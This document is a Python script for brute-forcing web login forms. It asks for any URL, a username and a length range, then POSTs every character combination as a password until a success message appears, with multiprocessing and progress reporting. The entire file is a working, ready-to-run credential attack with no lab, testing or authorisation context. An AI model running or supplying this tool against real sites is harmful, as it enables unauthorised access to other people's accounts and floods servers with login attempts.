import multiprocessing
import itertools
import requests
import string
import time

url = input("please enter a URL")
username = input("please enter a username")
min_length = int(input("min length:"))
max_length = int(input("max length:"))
characters = string.ascii_letters + string.digits + "!@#$%^&*()"

SUCCESS_STATUS = [200, 302]
SUCCESS_TEXT = "login successful"
ERROR_TEXT = "Invalid username or password"


def attempt_login(password, stop_flag):
    if stop_flag.value:
        return False  # Stop if flag is set

    data = {"username": username, "password": password}
    try:
        with requests.Session() as session:
            response = session.post(url, data=data, timeout=5)
            if response.status_code in SUCCESS_STATUS and SUCCESS_TEXT in response.text and ERROR_TEXT not in response.text:
                print(f"[+] Password found: {password}")
                stop_flag.value = True  # Signal to stop all workers
                return True
        return False
    except requests.RequestException as e:
        print(f"[-] Connection error: {e}")
        return False


def password_generator(length):
    """Generator for password combinations of given length."""
    return itertools.product(characters, repeat=length)


def worker_task(length, stop_flag, progress_dict):
    """Worker task to generate and test passwords."""
    total_combinations = len(characters) ** length
    tested = 0

    for password_tuple in password_generator(length):
        if stop_flag.value:
            return
        password = ''.join(password_tuple)
        tested += 1
        progress_dict[length] = (tested, total_combinations)
        if attempt_login(password, stop_flag):
            return


def display_progress(progress_dict, stop_flag):
    """Periodically display progress."""
    while not stop_flag.value:
        print("\n[Progress]")
        for length, (tested, total) in progress_dict.items():
            percent = (tested / total) * 100
            print(f"Length {length}: {tested}/{total} ({percent:.2f}%)")
        time.sleep(5)


if __name__ == "__main__":
    num_workers = multiprocessing.cpu_count()
    manager = multiprocessing.Manager()
    stop_flag = manager.Value('b', False)  # Shared stop flag
    progress_dict = manager.dict()  # Shared progress dictionary

    display_process = multiprocessing.Process(target=display_progress, args=(progress_dict, stop_flag))
    display_process.start()

    # Creating a Pool without the initializer
    with multiprocessing.Pool(num_workers) as pool:
        try:
            for length in range(min_length, max_length + 1):
                print(f"[*] Testing passwords of length {length}...")
                progress_dict[length] = (0, len(characters) ** length)
                pool.starmap(worker_task, [(length, stop_flag, progress_dict)])
                if stop_flag.value:
                    break
        except KeyboardInterrupt:
            print("[!] Stopping...")
            stop_flag.value = True
            pool.terminate()
            pool.join()
        finally:
            display_process.terminate()

    if stop_flag.value:
        print("[+] Password cracking complete or interrupted.")
    else:
        print("[-] No valid password found in the given range.")
